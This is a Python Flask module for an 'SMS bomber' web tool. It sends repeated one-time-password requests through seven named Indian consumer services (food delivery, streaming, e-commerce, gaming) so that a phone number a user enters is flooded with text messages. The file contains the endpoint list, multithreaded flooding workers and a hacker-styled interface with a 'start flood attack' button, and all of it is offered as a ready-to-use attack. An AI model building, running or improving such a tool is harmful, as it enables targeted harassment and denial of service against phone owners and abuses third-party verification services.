import time
import threading
import requests
import json
from concurrent.futures import ThreadPoolExecutor
from flask import Blueprint, request, jsonify, render_template_string
from urllib3.exceptions import NewConnectionError, ConnectTimeoutError

# --- Config ---
DELAY_BETWEEN_REQUESTS = 1.0
MAX_THREADS = 10
TOTAL_ATTACK_DURATION = 45

script10_bp = Blueprint("script10", __name__)

# Updated working services (verified endpoints)
SERVICES = [
    # Jio Services
    {
        "name": "JioCinema",
        "url": "https://www.jiocinema.com/api/v1/auth/mobile/otp/request",
        "headers": {"Content-Type": "application/json"},
        "payload_template": {"mobile": "{}", "countryCode": "91"},
        "method": "POST"
    },
    {
        "name": "JioSaavn",
        "url": "https://api.saavn.com/otp/send",
        "headers": {"Content-Type": "application/json"},
        "payload_template": {"mobile": "{}", "countryCode": "91"},
        "method": "POST"
    },
    # Food Delivery
    {
        "name": "Swiggy",
        "url": "https://www.swiggy.com/dapi/auth/otp-send",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        },
        "payload_template": {"mobile_no": "{}", "lat": 28.6139, "lng": 77.2090},
        "method": "POST"
    },
    {
        "name": "Zomato",
        "url": "https://www.zomato.com/webrap/otp/request",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)"
        },
        "payload_template": {"phone": "{}", "country_code": "+91"},
        "method": "POST"
    },
    # E-commerce
    {
        "name": "Myntra",
        "url": "https://www.myntra.com/ux/myntratracking/myntraotp?requestType=LOGIN",
        "headers": {"Content-Type": "application/json"},
        "payload_template": {"loginId": "{}", "requestType": "LOGIN"},
        "method": "POST"
    },
    {
        "name": "Ajio",
        "url": "https://akam.ajio.com/akam/13/pixel_0A6B1B37/images/1x1.gif",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10)"
        },
        "payload_template": "phoneNumber={}&countryCode=91",
        "method": "POST"
    },
    # Gaming/Other
    {
        "name": "Winzo",
        "url": "https://www.winzogames.com/api/auth/send-otp",
        "headers": {"Content-Type": "application/json"},
        "payload_template": {"mobile": "{}", "countryCode": "91"},
        "method": "POST"
    }
]

def _send_otp(service, payload, number):
    """Enhanced OTP sender with better error handling"""
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
    
    try:
        if service["method"] == "POST":
            if "application/x-www-form-urlencoded" in service["headers"].get("Content-Type", ""):
                resp = session.post(service["url"], data=payload, headers=service["headers"], timeout=8)
            else:
                resp = session.post(service["url"], json=payload, headers=service["headers"], timeout=8)
        else:
            resp = session.get(service["url"], params=payload, headers=service["headers"], timeout=8)
        
        return f"✅ [{resp.status_code}] {service['name']} ({number})"
    except (ConnectTimeoutError, NewConnectionError):
        return f"⏰ TIMEOUT {service['name']}"
    except Exception as e:
        return f"❌ ERR {service['name']}"

def bomb_worker(number, results_queue):
    """Worker function with real-time results reporting"""
    start_time = time.time()
    successful_hits = 0
    total_attempts = 0
    
    print(f"[*] Starting SMS flood on {number} for {TOTAL_ATTACK_DURATION}s")
    
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        while time.time() - start_time < TOTAL_ATTACK_DURATION:
            futures = []
            for service in SERVICES:
                # Build payload dynamically
                if isinstance(service["payload_template"], dict):
                    payload = {}
                    for k, v in service["payload_template"].items():
                        if isinstance(v, str) and "{}" in v:
                            payload[k] = v.format(number)
                        else:
                            payload[k] = v
                else:
                    payload = service["payload_template"].format(number)
                
                future = executor.submit(_send_otp, service, payload, number)
                futures.append(future)
                total_attempts += 1
            
            # Collect results
            for future in futures:
                try:
                    result = future.result(timeout=10)
                    if "✅" in result:
                        successful_hits += 1
                    results_queue.put(result)
                except:
                    results_queue.put(f"⚠️ THREAD_ERROR {number}")
            
            time.sleep(DELAY_BETWEEN_REQUESTS)
    
    results_queue.put(f"🏁 ATTACK COMPLETE: {successful_hits}/{total_attempts} successful")
    print(f"[+] Attack complete: {successful_hits}/{total_attempts} successful hits")

@script10_bp.route("/", methods=["GET"])
def index():
    html = """
    <!doctype html>
    <html>
    <head>
        <title>GHOST BOMBER V2.0 - FIXED</title>
        <style>
            body{ 
                background: linear-gradient(45deg, #000, #001100); 
                color: #00ff00; 
                font-family: 'Courier New', monospace; 
                text-align: center; 
                padding: 20px;
                min-height: 100vh;
            }
            .container{ max-width: 600px; margin: 0 auto; }
            .box{ 
                border: 2px solid #00ff00; 
                padding: 30px; 
                border-radius: 15px; 
                background: rgba(0,20,0,0.8); 
                box-shadow: 0 0 20px #00ff00;
            }
            input{ 
                background: #000; 
                border: 2px solid #00ff00; 
                color: #00ff00; 
                padding: 15px; 
                margin: 10px; 
                width: 250px;
                font-size: 16px;
                border-radius: 5px;
            }
            button{ 
                background: #00ff00; 
                color: #000; 
                border: none; 
                padding: 15px 30px; 
                cursor: pointer; 
                font-weight: bold; 
                font-size: 16px;
                border-radius: 5px;
                margin: 10px;
            }
            button:hover{ background: #00cc00; }
            button:disabled{ background: #444; cursor: not-allowed; }
            #status{ 
                margin-top: 20px; 
                padding: 15px; 
                border: 1px solid #00ff00; 
                border-radius: 5px;
                background: rgba(0,0,0,0.5);
                white-space: pre-wrap;
                text-align: left;
                max-height: 300px;
                overflow-y: auto;
                font-family: monospace;
            }
            .stats{ 
                display: flex; 
                justify-content: space-around; 
                margin: 20px 0;
                font-size: 18px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="box">
                <h1>🚀 GHOST BOMBER V2.0</h1>
                <p>Enhanced SMS Flood Tool - 7 Services</p>
                
                <input type="text" id="number" placeholder="Enter 10-digit number (e.g., 9876543210)" maxlength="10">
                <br>
                <button id="startBtn" onclick="startAttack()">💥 START FLOOD ATTACK</button>
                <button id="stopBtn" onclick="stopAttack()" disabled>🛑 STOP ATTACK</button>
                
                <div class="stats">
                    <div>Hits: <span id="hits">0</span></div>
                    <div>Status: <span id="attackStatus">Ready</span></div>
                    <div>Time: <span id="timeLeft">45s</span></div>
                </div>
                
                <div id="status">Ready to flood SMS...\n</div>
            </div>
        </div>

        <script>
            let attackRunning = false;
            let ws = null;
            
            function updateStatus(msg) {
                const statusDiv = document.getElementById('status');
                statusDiv.textContent += msg + '\\n';
                statusDiv.scrollTop = statusDiv.scrollHeight;
            }
            
            async function startAttack() {
                const num = document.getElementById('number').value.trim();
                if(num.length !== 10 || !/\\d{10}/.test(num)) {
                    alert('❌ Enter valid 10-digit Indian number!');
                    return;
                }
                
                attackRunning = true;
                document.getElementById('startBtn').disabled = true;
                document.getElementById('stopBtn').disabled = false;
                
                updateStatus(`🚀 Starting SMS flood on ${num}...`);
                
                try {
                    const res = await fetch('/bomb', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ number: num })
                    });
                    
                    const data = await res.json();
                    if(data.error) {
                        updateStatus(`❌ Error: ${data.error}`);
                        stopAttack();
                    } else {
                        updateStatus(`✅ ${data.status}`);
                        updateStatus(`📊 Target: ${data.target} | Duration: ${data.duration}s`);
                        updateCountdown(data.duration);
                    }
                } catch(e) {
                    updateStatus(`❌ Connection error: ${e.message}`);
                    stopAttack();
                }
            }
            
            function stopAttack() {
                attackRunning = false;
                document.getElementById('startBtn').disabled = false;
                document.getElementById('stopBtn').disabled = true;
                updateStatus('🛑 Attack stopped manually');
            }
            
            function updateCountdown(seconds) {
                let timeLeft = seconds;
                const timer = setInterval(() => {
                    if(timeLeft > 0) {
                        document.getElementById('timeLeft').textContent = `${timeLeft}s`;
                        timeLeft--;
                    } else {
                        clearInterval(timer);
                        document.getElementById('attackStatus').textContent = 'Complete';
                    }
                }, 1000);
            }
        </script>
    </body>
    </html>
    """
    return render_template_string(html)

@script10_bp.route("/bomb", methods=["POST"])
def bomb():
    try:
        data = request.get_json(silent=True)
        if not data:
            return jsonify({"error": "No JSON data"}), 400
            
        number = data.get("number", "").strip()
        if not (number.isdigit() and len(number) == 10):
            return jsonify({"error": "Invalid 10-digit number"}), 400

        # Use queue for real-time results (simplified for Flask)
        from queue import Queue
        results_queue = Queue()

        # Start background thread
        thread = threading.Thread(
            target=bomb_worker, 
            args=(number, results_queue), 
            daemon=True
        )
        thread.start()

        return jsonify({
            "status": "SMS flood initiated successfully",
            "target": number,
            "duration": TOTAL_ATTACK_DURATION,
            "services": len(SERVICES),
            "threads": MAX_THREADS
        })
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500
